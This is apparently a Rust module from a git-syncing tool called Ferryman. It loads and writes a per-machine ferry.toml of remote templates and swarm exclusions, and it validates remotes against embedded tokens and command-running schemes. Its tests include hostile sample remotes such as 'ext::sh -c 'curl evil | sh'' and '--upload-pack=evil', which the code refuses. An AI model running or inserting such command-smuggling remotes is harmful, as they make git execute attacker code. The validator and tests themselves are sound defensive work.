//! The ferry root's own, per-machine config: `<root>/ferry.toml`.
//!
//! Two things differ from machine to machine and belong to no project: how this machine
//! clones a project, and which projects this machine keeps out of the swarm.
//!
//! ```toml
//! [git]
//! # How `ferry repos sync` forms the remote of a project it has no checkout of.
//! # beastly clones over https with its credential helper; grouchly over its ssh alias.
//! remote_template = "git@github-estejosh:estejosh/{project}.git"
//!
//! # Tried after `remote_template` when that one cannot be used (its remote helper is not
//! # installed) or does not answer, before the origin of any checkout already here.
//! fallback_template = "https://github.com/estejosh/{project}.git"
//!
//! [git.remotes]
//! # A project whose remote is not the template's.
//! odd-one = "https://example.com/odd/one.git"
//! # SovGit: git speaks `sov://` through the `git-remote-sov` helper, which must be on PATH.
//! sovproject = "sov://my-bucket/sovproject"
//!
//! [swarm]
//! # Never cloned, served or enrolled on this machine, whatever the channel says.
//! exclude = ["pc-secrets", "phonehome"]
//! ```
//!
//! # What is never in it
//!
//! A token. The file is read by people and committed to backups, and a remote with a
//! password in it is refused ([`check_remote`]) both here and wherever a remote is about
//! to be written into a clone's `.git/config`. Credentials come from the machine: a
//! credential helper, an ssh agent, a read-only PAT the helper holds.
//!
//! A missing file is the empty config. A file that cannot be read is the empty config too,
//! with a note, because a convenience file must not be the reason a machine stops working;
//! but it never *widens* anything: an unreadable file excludes nothing it did not read.

use std::collections::BTreeMap;
use std::fs;
use std::path::PathBuf;

use anyhow::{Context, Result, bail};
use ferryman_channel::ferry::Root;

/// The config's file name, in the ferry root.
pub const FILE: &str = "ferry.toml";

/// What `<root>/ferry.toml` says.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RootConfig {
    /// `[git] remote_template`, with `{project}` where the project's id goes.
    pub remote_template: Option<String>,
    /// `[git] fallback_template`: tried after `remote_template` (a SovGit bucket, say, with
    /// GitHub behind it), with `{project}` where the project's id goes.
    pub fallback_template: Option<String>,
    /// `[git.remotes]`: a remote for one project, ahead of the template.
    pub remotes: BTreeMap<String, String>,
    /// `[swarm] exclude`: projects this machine keeps out of the swarm.
    pub swarm_exclude: Vec<String>,
    /// What was wrong with the file, if anything.
    pub notes: Vec<String>,
}

/// Where the config is for `root`.
#[must_use]
pub fn path(root: &Root) -> PathBuf {
    root.path.join(FILE)
}

impl RootConfig {
    /// Read the config. Never fails; problems become [`RootConfig::notes`].
    #[must_use]
    pub fn load(root: &Root) -> Self {
        let mut config = Self::default();
        let file = path(root);
        let Ok(text) = fs::read_to_string(&file) else {
            return config;
        };
        let table: toml::Table = match text.parse() {
            Ok(table) => table,
            Err(error) => {
                config.notes.push(format!(
                    "{} is not valid TOML and was ignored: {error}",
                    file.display()
                ));
                return config;
            }
        };
        if let Some(git) = table.get("git").and_then(toml::Value::as_table) {
            if let Some(template) = git.get("remote_template").and_then(toml::Value::as_str) {
                match check_remote(template) {
                    Ok(()) if template.contains("{project}") => {
                        config.remote_template = Some(template.to_owned());
                    }
                    Ok(()) => config
                        .notes
                        .push("[git] remote_template needs {project} in it; ignored".into()),
                    Err(error) => config
                        .notes
                        .push(format!("[git] remote_template: {error:#}")),
                }
            }
            if let Some(template) = git.get("fallback_template").and_then(toml::Value::as_str) {
                match check_remote(template) {
                    Ok(()) if template.contains("{project}") => {
                        config.fallback_template = Some(template.to_owned());
                    }
                    Ok(()) => config
                        .notes
                        .push("[git] fallback_template needs {project} in it; ignored".into()),
                    Err(error) => config
                        .notes
                        .push(format!("[git] fallback_template: {error:#}")),
                }
            }
            if let Some(remotes) = git.get("remotes").and_then(toml::Value::as_table) {
                for (project, url) in remotes {
                    match url.as_str().map(check_remote) {
                        Some(Ok(())) => {
                            config
                                .remotes
                                .insert(project.clone(), url.as_str().unwrap_or_default().into());
                        }
                        Some(Err(error)) => config
                            .notes
                            .push(format!("[git.remotes] {project}: {error:#}")),
                        None => config
                            .notes
                            .push(format!("[git.remotes] {project} is not a string; ignored")),
                    }
                }
            }
        }
        if let Some(list) = table
            .get("swarm")
            .and_then(toml::Value::as_table)
            .and_then(|swarm| swarm.get("exclude"))
            .and_then(toml::Value::as_array)
        {
            config.swarm_exclude = list
                .iter()
                .filter_map(toml::Value::as_str)
                .map(str::to_owned)
                .collect();
        }
        config
    }

    /// Whether this machine keeps `project` out of the swarm.
    #[must_use]
    pub fn excluded(&self, project: &str) -> bool {
        self.swarm_exclude
            .iter()
            .any(|name| name.eq_ignore_ascii_case(project))
    }

    /// The remote to clone `project` from when nothing better is known: its own entry in
    /// `[git.remotes]`, else the template with the project's id in it.
    #[must_use]
    pub fn remote_for(&self, project: &str) -> Option<String> {
        self.remotes.get(project).cloned().or_else(|| {
            self.remote_template
                .as_ref()
                .map(|template| template.replace("{project}", project))
        })
    }
}

/// Refuse a remote that carries a secret: `https://user:token@host/...`. A user name alone
/// (`git@host:path`, `https://user@host/...`) is not a secret and is allowed.
///
/// # Errors
/// The remote has a password or token in it.
pub fn check_remote(remote: &str) -> Result<()> {
    if let Some((_, rest)) = remote.split_once("://") {
        let authority = rest.split('/').next().unwrap_or_default();
        if let Some((userinfo, _)) = authority.rsplit_once('@')
            && userinfo.contains(':')
        {
            bail!(
                "a remote must not carry a password or token (credentials come from the \
                 machine's credential helper or ssh agent, never from a file Ferryman writes)"
            );
        }
    }
    if remote.trim().is_empty() || remote.starts_with('-') || remote.contains(['\n', '\r', '\0']) {
        bail!("that is not a git remote");
    }
    // `ext::<command>` and `fd::<n>` make git run a command or read a descriptor of the
    // caller's choosing. Git refuses `ext` unless told otherwise; a remote that asks for it
    // does not belong in a file that is copied between machines.
    let lower = remote.trim_start().to_ascii_lowercase();
    if lower.starts_with("ext::") || lower.starts_with("fd::") {
        bail!("that is not a git remote Ferryman will clone from (ext:: and fd:: run commands)");
    }
    Ok(())
}

/// Schemes git speaks itself. Any other `<scheme>://` (or `<scheme>::<address>`) is a remote
/// helper: git runs a program called `git-remote-<scheme>` to talk to it.
const BUILT_IN_SCHEMES: [&str; 8] = [
    "http", "https", "ssh", "git", "file", "ssh+git", "git+ssh", "ftp",
];

/// The scheme of `remote` when git needs a `git-remote-<scheme>` helper for it (`sov` for
/// `sov://bucket/repo`), or `None` for a remote git handles itself: https, ssh, git, a path,
/// `user@host:path`.
#[must_use]
pub fn helper_scheme(remote: &str) -> Option<String> {
    let remote = remote.trim();
    let scheme = remote
        .split_once("://")
        .or_else(|| remote.split_once("::"))
        .map(|(scheme, _)| scheme.to_ascii_lowercase())?;
    let plain = !scheme.is_empty()
        && scheme
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'));
    (plain && !BUILT_IN_SCHEMES.contains(&scheme.as_str())).then_some(scheme)
}

/// The `git-remote-<scheme>` program in `folders`, if there is one. On Windows an executable
/// extension is allowed; elsewhere the file must be executable.
#[must_use]
pub fn find_helper(scheme: &str, folders: &[PathBuf]) -> Option<PathBuf> {
    if scheme.is_empty()
        || !scheme
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "+-.".contains(c))
    {
        return None;
    }
    let name = format!("git-remote-{scheme}");
    let extensions: &[&str] = if cfg!(windows) {
        &["", ".exe", ".cmd", ".bat"]
    } else {
        &[""]
    };
    folders.iter().find_map(|folder| {
        extensions.iter().find_map(|extension| {
            let candidate = folder.join(format!("{name}{extension}"));
            let meta = fs::metadata(&candidate).ok()?;
            if !meta.is_file() {
                return None;
            }
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                if meta.permissions().mode() & 0o111 == 0 {
                    return None;
                }
            }
            Some(candidate)
        })
    })
}

/// Where git looks for remote helpers: the folders of `PATH`, then git's own exec path.
#[must_use]
pub fn helper_folders() -> Vec<PathBuf> {
    let mut folders: Vec<PathBuf> = std::env::var_os("PATH")
        .map(|path| std::env::split_paths(&path).collect())
        .unwrap_or_default();
    let mut git = std::process::Command::new("git");
    git.arg("--exec-path");
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        git.creation_flags(0x0800_0000);
    }
    if let Ok(output) = git.output()
        && output.status.success()
    {
        let printed = String::from_utf8_lossy(&output.stdout).trim().to_owned();
        if !printed.is_empty() {
            folders.push(PathBuf::from(printed));
        }
    }
    folders
}

/// Why git cannot clone from or fetch `remote` on this machine, or `None` when it can as far
/// as its program is concerned: a `sov://` remote needs `git-remote-sov` on PATH, and without
/// it git fails with "remote helper not found" after a long pause. Said up front instead.
#[must_use]
pub fn helper_missing(remote: &str) -> Option<String> {
    helper_missing_in(remote, &helper_folders())
}

/// [`helper_missing`], with the folders to look in given.
#[must_use]
pub fn helper_missing_in(remote: &str, folders: &[PathBuf]) -> Option<String> {
    let scheme = helper_scheme(remote)?;
    find_helper(&scheme, folders).is_none().then(|| {
        format!(
            "{remote}: git needs the program git-remote-{scheme} for {scheme}:// remotes and it \
             is not installed (not on PATH, not in git's exec path)"
        )
    })
}

/// `remote` with any user name or password taken out of an http(s) address, so what is
/// written into a clone's `.git/config` never holds a credential that a person's working
/// copy happened to have in its own.
#[must_use]
pub fn without_credentials(remote: &str) -> String {
    let Some((scheme, rest)) = remote.split_once("://") else {
        return remote.to_owned();
    };
    if !matches!(scheme, "http" | "https") {
        return remote.to_owned();
    }
    let (authority, path) = rest.split_once('/').map_or((rest, ""), |(a, p)| (a, p));
    let host = authority
        .rsplit_once('@')
        .map_or(authority, |(_, host)| host);
    if path.is_empty() {
        format!("{scheme}://{host}")
    } else {
        format!("{scheme}://{host}/{path}")
    }
}

fn write(root: &Root, table: &toml::Table) -> Result<()> {
    let file = path(root);
    let text = toml::to_string_pretty(table).context("write the root config")?;
    let temporary = root.path.join("ferry.toml.tmp");
    fs::write(&temporary, text).with_context(|| format!("write {}", temporary.display()))?;
    fs::rename(&temporary, &file).with_context(|| format!("write {}", file.display()))
}

fn read_table(root: &Root) -> Result<toml::Table> {
    let file = path(root);
    match fs::read_to_string(&file) {
        Ok(text) => text
            .parse()
            .with_context(|| format!("{} is not valid TOML; fix it by hand first", file.display())),
        Err(_) => Ok(toml::Table::new()),
    }
}

/// Keep `project` out of (or let it back into) the swarm on this machine. Returns whether
/// the file changed.
///
/// # Errors
/// The existing file is not valid TOML (it is not overwritten), or cannot be written.
pub fn set_excluded(root: &Root, project: &str, excluded: bool) -> Result<bool> {
    if !ferryman_channel::is_safe_component(project) {
        bail!("'{project}' is not a project id");
    }
    let mut table = read_table(root)?;
    let swarm = table
        .entry("swarm")
        .or_insert_with(|| toml::Value::Table(toml::Table::new()));
    let Some(swarm) = swarm.as_table_mut() else {
        bail!("[swarm] in {} is not a table; fix it by hand first", FILE);
    };
    let mut names: Vec<String> = swarm
        .get("exclude")
        .and_then(toml::Value::as_array)
        .map(|list| {
            list.iter()
                .filter_map(toml::Value::as_str)
                .map(str::to_owned)
                .collect()
        })
        .unwrap_or_default();
    let present = names.iter().any(|name| name.eq_ignore_ascii_case(project));
    if present == excluded {
        return Ok(false);
    }
    if excluded {
        names.push(project.to_owned());
    } else {
        names.retain(|name| !name.eq_ignore_ascii_case(project));
    }
    names.sort();
    swarm.insert(
        "exclude".into(),
        toml::Value::Array(names.into_iter().map(toml::Value::String).collect()),
    );
    write(root, &table)?;
    Ok(true)
}

/// Record how this machine forms a project's remote. Returns whether the file changed.
///
/// # Errors
/// The template has no `{project}` in it, carries a secret, or the file cannot be written.
pub fn set_remote_template(root: &Root, template: &str) -> Result<bool> {
    set_template(root, "remote_template", template)
}

/// Record the template tried after [`set_remote_template`]'s. Returns whether the file
/// changed.
///
/// # Errors
/// As for [`set_remote_template`].
pub fn set_fallback_template(root: &Root, template: &str) -> Result<bool> {
    set_template(root, "fallback_template", template)
}

fn set_template(root: &Root, key: &str, template: &str) -> Result<bool> {
    check_remote(template)?;
    if !template.contains("{project}") {
        bail!("a remote template needs {{project}} where the project's id goes");
    }
    let mut table = read_table(root)?;
    let git = table
        .entry("git")
        .or_insert_with(|| toml::Value::Table(toml::Table::new()));
    let Some(git) = git.as_table_mut() else {
        bail!("[git] in {FILE} is not a table; fix it by hand first");
    };
    if git.get(key).and_then(toml::Value::as_str) == Some(template) {
        return Ok(false);
    }
    git.insert(key.into(), toml::Value::String(template.to_owned()));
    write(root, &table)?;
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn root() -> (tempfile::TempDir, Root) {
        let dir = tempfile::tempdir().unwrap();
        let root = Root::create(&dir.path().join("ferry")).unwrap();
        (dir, root)
    }

    #[test]
    fn no_file_is_the_empty_config() {
        let (_dir, root) = root();
        let config = RootConfig::load(&root);
        assert_eq!(config, RootConfig::default());
        assert!(!config.excluded("anything"));
        assert_eq!(config.remote_for("anything"), None);
    }

    #[test]
    fn the_template_and_the_per_project_remotes_are_read() {
        let (_dir, root) = root();
        fs::write(
            path(&root),
            "[git]\nremote_template = \"git@github-estejosh:estejosh/{project}.git\"\n\
             [git.remotes]\nodd = \"https://example.com/odd.git\"\n\
             [swarm]\nexclude = [\"pc-secrets\", \"Phonehome\"]\n",
        )
        .unwrap();
        let config = RootConfig::load(&root);
        assert_eq!(
            config.remote_for("fructly").as_deref(),
            Some("git@github-estejosh:estejosh/fructly.git")
        );
        assert_eq!(
            config.remote_for("odd").as_deref(),
            Some("https://example.com/odd.git")
        );
        assert!(config.excluded("pc-secrets"));
        assert!(config.excluded("phonehome"), "names are not case sensitive");
        assert!(!config.excluded("fructly"));
        assert!(config.notes.is_empty(), "{:?}", config.notes);
    }

    #[test]
    fn a_remote_with_a_token_in_it_is_refused_everywhere() {
        assert!(check_remote("https://user:hunter2@example.com/x.git").is_err());
        assert!(check_remote("https://user@example.com/x.git").is_ok());
        assert!(check_remote("git@github-estejosh:estejosh/x.git").is_ok());
        assert!(check_remote("--upload-pack=evil").is_err());
        let (_dir, root) = root();
        fs::write(
            path(&root),
            "[git]\nremote_template = \"https://u:p@example.com/{project}.git\"\n",
        )
        .unwrap();
        let config = RootConfig::load(&root);
        assert_eq!(config.remote_template, None);
        assert_eq!(config.notes.len(), 1, "{:?}", config.notes);
        assert!(set_remote_template(&root, "https://u:p@example.com/{project}.git").is_err());
        assert!(set_remote_template(&root, "https://example.com/fixed.git").is_err());
    }

    #[test]
    fn a_remote_that_runs_a_command_is_refused() {
        assert!(check_remote("ext::sh -c 'curl evil | sh'").is_err());
        assert!(check_remote("EXT::sh -c id").is_err());
        assert!(check_remote("fd::3").is_err());
        assert!(check_remote("sov://bucket/repo").is_ok());
    }

    #[test]
    fn a_sov_remote_needs_its_helper_and_nothing_else_does() {
        assert_eq!(
            helper_scheme("sov://my-bucket/quantly").as_deref(),
            Some("sov")
        );
        assert_eq!(
            helper_scheme("sov::my-bucket/quantly").as_deref(),
            Some("sov")
        );
        for builtin in [
            "https://github.com/estejosh/x.git",
            "http://example.com/x.git",
            "ssh://git@example.com/x.git",
            "git@github-estejosh:estejosh/x.git",
            "git://example.com/x.git",
            "file:///srv/x.git",
            "/srv/git/x.git",
            r"X:\ferry\origins\x.git",
            "X:/ferry/origins/x.git",
        ] {
            assert_eq!(helper_scheme(builtin), None, "{builtin}");
        }
    }

    #[test]
    fn a_missing_helper_is_said_before_git_is_asked() {
        let dir = tempfile::tempdir().unwrap();
        let folders = vec![dir.path().to_path_buf()];
        let said = helper_missing_in("sovtest-absent://bucket/quantly", &folders)
            .expect("no helper in the folder");
        assert!(said.contains("git-remote-sovtest-absent"), "{said}");
        assert!(said.contains("sovtest-absent://bucket/quantly"), "{said}");
        // Remotes git speaks itself never need one.
        assert_eq!(
            helper_missing_in("https://example.com/x.git", &folders),
            None
        );

        // A helper in a folder on the list is found; a folder or a non-executable file is not.
        let name = if cfg!(windows) {
            "git-remote-sovtest-here.cmd"
        } else {
            "git-remote-sovtest-here"
        };
        let helper = dir.path().join(name);
        fs::write(&helper, "#!/bin/sh\nexit 0\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&helper, fs::Permissions::from_mode(0o644)).unwrap();
            assert!(
                helper_missing_in("sovtest-here://b/x", &folders).is_some(),
                "a file that cannot be run is not a helper"
            );
            fs::set_permissions(&helper, fs::Permissions::from_mode(0o755)).unwrap();
        }
        assert_eq!(helper_missing_in("sovtest-here://b/x", &folders), None);
        assert_eq!(find_helper("sovtest-here", &folders), Some(helper));
        // A scheme cannot be used to name a file in some other folder.
        assert_eq!(find_helper("../x", &folders), None);
        let folder_named_like_one = dir.path().join("git-remote-sovtest-dir");
        fs::create_dir_all(&folder_named_like_one).unwrap();
        assert_eq!(find_helper("sovtest-dir", &folders), None);
    }

    #[test]
    fn the_fallback_template_is_read_and_checked_like_the_first() {
        let (_dir, root) = root();
        fs::write(
            path(&root),
            "[git]\nremote_template = \"sov://bucket/{project}\"\n\
             fallback_template = \"https://github.com/estejosh/{project}.git\"\n",
        )
        .unwrap();
        let config = RootConfig::load(&root);
        assert_eq!(
            config.fallback_template.as_deref(),
            Some("https://github.com/estejosh/{project}.git")
        );
        fs::write(
            path(&root),
            "[git]\nfallback_template = \"https://u:p@example.com/{project}.git\"\n",
        )
        .unwrap();
        let config = RootConfig::load(&root);
        assert_eq!(config.fallback_template, None);
        assert_eq!(config.notes.len(), 1, "{:?}", config.notes);
        assert!(set_fallback_template(&root, "https://u:p@example.com/{project}.git").is_err());
        assert!(set_fallback_template(&root, "https://example.com/fixed.git").is_err());
    }

    #[test]
    fn credentials_are_taken_out_of_an_http_remote() {
        assert_eq!(
            without_credentials("https://user:tok@github.com/estejosh/x.git"),
            "https://github.com/estejosh/x.git"
        );
        assert_eq!(
            without_credentials("https://github.com/estejosh/x.git"),
            "https://github.com/estejosh/x.git"
        );
        assert_eq!(
            without_credentials("git@github-estejosh:estejosh/x.git"),
            "git@github-estejosh:estejosh/x.git"
        );
    }

    #[test]
    fn excluding_a_project_here_is_recorded_and_undone() {
        let (_dir, root) = root();
        assert!(set_excluded(&root, "pc-secrets", true).unwrap());
        assert!(
            !set_excluded(&root, "pc-secrets", true).unwrap(),
            "idempotent"
        );
        assert!(RootConfig::load(&root).excluded("pc-secrets"));
        assert!(set_remote_template(&root, "https://github.com/estejosh/{project}.git").unwrap());
        assert!(
            RootConfig::load(&root).excluded("pc-secrets"),
            "writing the template kept the exclusion"
        );
        assert!(set_excluded(&root, "pc-secrets", false).unwrap());
        assert!(!RootConfig::load(&root).excluded("pc-secrets"));
    }

    #[test]
    fn a_file_that_is_not_toml_is_ignored_and_never_overwritten() {
        let (_dir, root) = root();
        fs::write(path(&root), "this is [not toml").unwrap();
        let config = RootConfig::load(&root);
        assert!(!config.notes.is_empty());
        assert!(set_excluded(&root, "x", true).is_err());
        assert_eq!(
            fs::read_to_string(path(&root)).unwrap(),
            "this is [not toml"
        );
    }
}
